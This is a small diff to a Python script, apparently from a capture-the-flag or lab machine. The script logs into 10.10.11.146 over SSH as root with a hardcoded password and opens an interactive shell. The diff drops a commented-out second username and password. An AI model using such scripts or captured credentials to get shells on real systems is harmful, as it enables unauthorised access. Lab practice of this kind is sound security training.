@@ -11,7 +11,6 @@ def kill(sig, frame):
 
 signal.signal(signal.SIGINT, kill)
 
-request = ssh(host='Undetected', user='root', password='@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3')
-#request = ssh(host='Undetected', user='steven1', password='ihatehackers')
+request = ssh(host='10.10.11.146', user='root', password='@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3')
 shell = request.process("/bin/sh")
 shell.interactive()
